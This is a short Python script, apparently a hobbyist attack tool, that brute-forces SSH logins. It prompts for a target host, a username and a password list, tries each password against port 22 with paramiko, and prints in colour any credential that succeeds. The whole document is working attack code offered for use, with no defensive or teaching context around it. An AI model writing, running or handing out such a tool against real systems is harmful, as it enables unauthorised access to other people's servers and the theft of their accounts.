import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0): #Connection Config
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('[->] Target Address: ')
username = input('[->] SSH Username: ')
input_file = input('[->] Passwords File: ')

if os.path.exists(input_file) == False:
    print('[T.T] File/Path does not exist')
    sys.exit(1)

with open(input_file, 'r') as file: #Checks for Password
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[->] Password Found for ' + username + ':' + password), 'green'))
                break
            elif response == 1:
                print(termcolor.colored(('[T.T] Incorrect Login: ' + password), 'red'))
            elif response == 2:
                print(termcolor.colored(('[zZZ] Connection Failed'), 'blue'))
                sys.exit(1)

        except Exception as e:
            print(e)
            pass